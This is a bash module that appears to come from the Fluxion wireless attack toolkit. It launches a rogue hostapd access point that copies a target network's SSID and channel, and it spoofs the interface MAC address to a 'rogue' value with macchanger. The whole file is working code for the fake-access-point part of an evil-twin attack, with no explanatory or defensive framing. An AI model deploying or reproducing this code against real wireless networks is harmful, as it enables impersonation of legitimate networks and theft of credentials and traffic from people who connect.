#!/bin/bash

# ================================================================
# Configuration Section
# ================================================================
VIGW=$WIAccessPoint
VIAP=$WIAccessPoint

# HostAPD sets the virtual interface mode
# to master, which is supported by dhcpd.
VIAPAddress=$VIGWAddress

APServiceConfigDirectory=$FLUXIONWorkspacePath
# ================================================================


#if [ "$APServiceVersion" ]; then return 0; fi
#readonly APServiceVersion="1.0"


function ap_stop() {
	if [ "$APServicePID" ]
		then kill $APServicePID &> $FLUXIONOutputDevice
	fi

	APServicePID=""
}

function ap_reset() {
	ap_stop

	# Reset MAC address to original.
	ifconfig $VIAP down
    sleep 0.5

	macchanger -p $VIAP &> $FLUXIONOutputDevice
    sleep 0.5

    ifconfig $VIAP up
    sleep 0.5
}

function ap_route() {
	echo "APService: No custom routes for hostapd" > $FLUXIONOutputDevice
}

function ap_prep() {
	ap_stop

	# Prepare the hostapd config file.
	echo "\
interface=$VIAP
driver=nl80211
ssid=$APTargetSSID
channel=$APTargetChannel\
" > "$APServiceConfigDirectory/$APRogueMAC-hostapd.conf"

	# Spoof virtual interface MAC address.
	ifconfig $VIAP down
    sleep 0.5

	macchanger --mac=$APRogueMAC $VIAP &> $FLUXIONOutputDevice
    sleep 0.5

    ifconfig $VIAP up
    sleep 0.5
}

function ap_start() {
    ap_stop

	xterm $FLUXIONHoldXterm $TOP -bg "#000000" -fg "#FFFFFF" -title "FLUXION AP Service [hostapd]" -e hostapd "$APServiceConfigDirectory/$APRogueMAC-hostapd.conf" &
    local parentPID=$!

	# Wait till hostapd has started and its virtual interface is ready.
	while [ ! "$APServicePID" ]
	    do sleep 1; APServicePID=$(pgrep -P $parentPID)
	done

	ap_route
}

# FLUXSCRIPT END
